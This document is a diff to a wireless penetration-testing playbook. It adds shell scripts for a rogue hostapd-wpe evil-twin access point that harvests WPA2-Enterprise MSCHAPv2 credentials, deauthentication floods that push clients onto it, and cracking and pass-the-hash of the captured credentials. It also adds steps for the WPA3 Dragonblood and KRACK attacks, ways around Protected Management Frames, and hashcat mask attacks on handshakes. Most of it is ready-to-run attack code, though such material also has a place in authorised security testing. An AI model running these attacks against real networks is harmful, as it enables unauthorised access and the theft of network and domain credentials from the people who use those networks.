@@ -351,6 +351,165 @@ echo "Hash file → $ENG/loot/wifi/hash_${TARGET_BSSID//:/_}.hc22000"
 
 ---
 
+## Phase 4c — WPA2-Enterprise (EAP) Attack
+
+Corporate networks using 802.1X EAP authentication require a different attack:
+Reconnaissance shows `MGT` in the auth column of airodump instead of `PSK`.
+
+```bash
+MON_IFACE=<monitor_interface>
+WLAN=<original_interface>
+TARGET_ESSID=<essid>
+TARGET_BSSID=<target_bssid>
+TARGET_CHANNEL=<channel>
+ENG=/home/kali/current
+
+echo "=== [Phase 4c] WPA2-Enterprise (EAP) Attack ==="
+echo "Check survey output: if AUTH column shows 'MGT' instead of 'PSK' → this phase applies"
+echo ""
+
+# Check if target uses WPA-Enterprise
+grep "$TARGET_BSSID" $ENG/scans/wifi/survey-01.csv 2>/dev/null | grep -qi "MGT\|EAP" && \
+    echo "[!] WPA2-Enterprise confirmed for $TARGET_ESSID" || \
+    echo "[?] Auth type uncertain — proceed anyway if corporate network suspected"
+
+echo ""
+echo "--- hostapd-wpe (rogue RADIUS server — captures MSCHAPv2 challenges) ---"
+# hostapd-wpe is patched hostapd that logs EAP credentials
+which hostapd-wpe 2>/dev/null && HOSTAPD_WPE="hostapd-wpe" || \
+    HOSTAPD_WPE="/usr/sbin/hostapd-wpe"
+
+cat > /tmp/hostapd_wpe.conf << EOF
+interface=$MON_IFACE
+ssid=$TARGET_ESSID
+channel=$TARGET_CHANNEL
+hw_mode=g
+ieee8021x=1
+eap_server=1
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.key
+private_key_passwd=whatever
+dh_file=/etc/hostapd-wpe/certs/dh
+eap_fast_a_id=101112131415161718191a1b1c1d1e1f
+eap_fast_a_id_info=hostapd-wpe
+eap_fast_prov=3
+pac_key_lifetime=604800
+pac_key_refresh_time=86400
+EOF
+
+$HOSTAPD_WPE /tmp/hostapd_wpe.conf 2>/dev/null | \
+    tee $ENG/loot/wifi/wpe_captures.txt | \
+    grep -E "MSCHAPv2|challenge|response|identity|username|mschapv2" &
+
+WPE_PID=$!
+echo "Rogue EAP server running (PID $WPE_PID)"
+echo "Clients connecting to '$TARGET_ESSID' will leak MSCHAPv2 challenge/response"
+echo ""
+echo "Deauth clients from real AP to force reconnection to rogue:"
+echo "  aireplay-ng -0 3 -a $TARGET_BSSID $MON_IFACE"
+echo ""
+sleep 10
+echo ""
+echo "Captured EAP credentials → $ENG/loot/wifi/wpe_captures.txt"
+grep -E "MSCHAPv2|challenge|response|identity" $ENG/loot/wifi/wpe_captures.txt 2>/dev/null | head -10
+echo ""
+echo "--- Cracking MSCHAPv2 ---"
+echo "1. asleap (fastest for NTLMv1-based MSCHAPv2):"
+echo "   asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt"
+echo ""
+echo "2. hashcat mode 5500 (NTLMv1) or 5600 (NTLMv2):"
+echo "   hashcat -m 5500 '<username>::<domain>:<challenge>:<response>' rockyou.txt -r best64.rule"
+echo ""
+echo "3. If MSCHAPv2 cracked → NT hash = domain credential → Pass-the-Hash:"
+echo "   netexec smb <dc-ip> -u <username> -H <nt_hash>"
+echo ""
+echo "--- Alternative: eaphammer (full EAP attack framework) ---"
+[ -d /opt/eaphammer ] || echo "Install: git clone https://github.com/s0lst1c3/eaphammer /opt/eaphammer && cd /opt/eaphammer && ./kali-setup"
+echo "Run: python3 /opt/eaphammer/eaphammer.py -i $MON_IFACE --channel $TARGET_CHANNEL --auth wpa-eap --essid $TARGET_ESSID --creds --hostile-portal"
+```
+
+---
+
+## Phase 4d — WPA3 / KRACK Attack
+
+```bash
+MON_IFACE=<monitor_interface>
+TARGET_BSSID=<target_bssid>
+TARGET_ESSID=<essid>
+TARGET_CHANNEL=<channel>
+ENG=/home/kali/current
+
+echo "=== [Phase 4d] WPA3 Dragonblood + KRACK ==="
+echo ""
+
+# Check if WPA3 (SAE handshake)
+echo "--- WPA3 SAE detection ---"
+grep "$TARGET_BSSID" $ENG/scans/wifi/survey-01.csv 2>/dev/null | grep -qi "SAE" && {
+    echo "[!] WPA3 SAE network: $TARGET_ESSID"
+    echo ""
+    echo "WPA3 Dragonblood CVE-2019-9494/9496 — side-channel attacks on SAE handshake"
+    echo ""
+    echo "Dragonslayer attack (cache-based side-channel timing):"
+    [ -d /opt/dragonslayer ] && \
+        python3 /opt/dragonslayer/dragonslayer.py -i "$MON_IFACE" -b "$TARGET_BSSID" 2>/dev/null | head -20 || {
+        echo "  Install: git clone https://github.com/vanhoefm/dragonslayer /opt/dragonslayer"
+        echo "  Run: python3 /opt/dragonslayer/dragonslayer.py -i $MON_IFACE -b $TARGET_BSSID"
+    }
+    echo ""
+    echo "WPA3-Transition mode bypass (if AP supports both WPA2 and WPA3):"
+    echo "  Many WPA3 APs advertise both for backward compat — attack the WPA2 side:"
+    echo "  Force client to use WPA2: deauth client while broadcasting WPA2-only AP (evil twin without WPA3)"
+    echo "  Evil twin: modify /tmp/evil_twin.conf to set wpa=2 (not wpa=6) → clients fall back to WPA2"
+} || echo "  Target does not use WPA3 SAE — skip this phase"
+
+echo ""
+echo "--- KRACK CVE-2017-13077 (key reinstallation) ---"
+echo "KRACK affects unpatched clients (Android 6/7, Linux wpa_supplicant < 2.7)"
+echo "The attack forces key reinstallation during 4-way handshake (nonce reuse → decrypt)"
+echo ""
+echo "krackattacks test script:"
+[ -d /opt/krackattacks ] && \
+    echo "  python3 /opt/krackattacks/krack-test-client.py --interface=$MON_IFACE" || {
+    echo "  Install: git clone https://github.com/vanhoefm/krackattacks-scripts /opt/krackattacks"
+    echo "  pip3 install -r /opt/krackattacks/requirements.txt"
+    echo "  python3 /opt/krackattacks/krack-test-client.py --interface=$MON_IFACE"
+}
+echo ""
+echo "KRACK result: if vulnerable, attacker can decrypt/replay/forge packets even on WPA2-PSK"
+echo "Most patched systems (post-2018) are not vulnerable to KRACK."
+echo ""
+echo "--- PMF / 802.11w awareness ---"
+echo "If deauth attacks consistently fail, AP has Protected Management Frames enabled."
+echo "PMF makes deauth/disassoc frames cryptographically signed — unauthenticated deauth is dropped."
+echo ""
+echo "PMF workarounds:"
+echo "  1. PMKID attack (Phase 4a) — passive, NO deauth needed — use this instead"
+echo "  2. Broadcast deauth (different multicast frame, sometimes bypasses PMF in optional mode)"
+echo "     aireplay-ng -0 5 -a $TARGET_BSSID $MON_IFACE  (without -c = broadcast)"
+echo "  3. KRACK against unpatched clients (doesn't need deauth)"
+echo "  4. Evil twin with stronger signal (clients prefer signal strength over PMF)"
+echo ""
+echo "--- Hidden SSID discovery ---"
+echo "Some APs suppress SSID broadcast — clients broadcast probes to find their networks."
+echo "Deauthing a client from a hidden AP forces it to send probe requests with the SSID."
+echo ""
+timeout 30 airodump-ng "$MON_IFACE" --output-format csv -w /tmp/hidden_probe 2>/dev/null &
+AIRODUMP_PID=$!
+sleep 5
+# Deauth all clients from target (hidden SSID probes will reveal it)
+aireplay-ng -0 3 -a "$TARGET_BSSID" "$MON_IFACE" 2>/dev/null | grep -v "^$" | head -3
+sleep 20
+kill $AIRODUMP_PID 2>/dev/null
+echo "Probe requests captured. Checking for hidden SSIDs..."
+grep -v "^Station\|^BSSID\|^$" /tmp/hidden_probe-01.csv 2>/dev/null | \
+    awk -F',' '{print $7}' | grep -v "not associated\|^$" | sort -u | \
+    while read ssid; do echo "  Hidden SSID found via probe: '$ssid'"; done
+```
+
+---
+
 ## Phase 5 — Hashcat WPA2 Cracking
 
 Crack the captured PMKID or handshake hash:
@@ -446,8 +605,53 @@ PYEOF
         -w 3 2>/dev/null | tail -5
 
     CRACKED=$(cat "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" 2>/dev/null | grep -v "^$" | wc -l)
-    [ "$CRACKED" -gt "0" ] && echo "[+] CRACKED: $(cat $ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt)" || \
-        echo "[-] Not cracked with common wordlists. Try PMKID attack + custom rules or brute force."
+    if [ "$CRACKED" -gt "0" ]; then
+        echo "[+] CRACKED: $(cat $ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt)"
+    else
+        echo "[-] Not cracked with wordlists. Trying mask attacks..."
+
+        echo "--- Round 4: 8-digit numeric mask (ISP default format) ---"
+        hashcat -m 22000 "$HASH_FILE" \
+            -a 3 '?d?d?d?d?d?d?d?d' \
+            --potfile-path "$ENG/loot/wifi/hashcat.pot" \
+            -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
+            -w 3 2>/dev/null | tail -5
+
+        echo "--- Round 5: ESSID prefix + 4-digit suffix (telecom default pattern) ---"
+        # Many ISP routers use first 6 chars of SSID + 4 digits
+        ESSID_PREFIX="${TARGET_ESSID:0:6}"
+        for suffix_mask in '?d?d?d?d' '?d?d?d?d?d?d' '?u?u?u?u?d?d?d?d'; do
+            hashcat -m 22000 "$HASH_FILE" \
+                -a 3 "${ESSID_PREFIX}${suffix_mask}" \
+                --potfile-path "$ENG/loot/wifi/hashcat.pot" \
+                -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
+                -w 3 2>/dev/null | tail -3
+        done
+
+        echo "--- Round 6: 10-digit phone number pattern ---"
+        hashcat -m 22000 "$HASH_FILE" \
+            -a 3 '?d?d?d?d?d?d?d?d?d?d' \
+            --potfile-path "$ENG/loot/wifi/hashcat.pot" \
+            -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
+            -w 3 2>/dev/null | tail -3
+
+        echo "--- Round 7: Upper+Lower+Digit combinator (8-10 char mixed) ---"
+        # Common pattern: FirstnameYYYY, CompanyName123!, etc.
+        hashcat -m 22000 "$HASH_FILE" \
+            -a 3 '?u?l?l?l?l?d?d?d?d' \
+            --potfile-path "$ENG/loot/wifi/hashcat.pot" \
+            -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
+            -w 3 2>/dev/null | tail -3
+        hashcat -m 22000 "$HASH_FILE" \
+            -a 3 '?u?l?l?l?l?l?d?d?d' \
+            --potfile-path "$ENG/loot/wifi/hashcat.pot" \
+            -o "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" \
+            -w 3 2>/dev/null | tail -3
+
+        CRACKED=$(cat "$ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt" 2>/dev/null | grep -v "^$" | wc -l)
+        [ "$CRACKED" -gt "0" ] && echo "[+] CRACKED via mask: $(cat $ENG/loot/wifi/cracked_${TARGET_BSSID//:/_}.txt)" || \
+            echo "[-] Not cracked. Consider: custom OSINT wordlist, combinator attack, or GPU rental."
+    fi
 fi
 
 echo ""
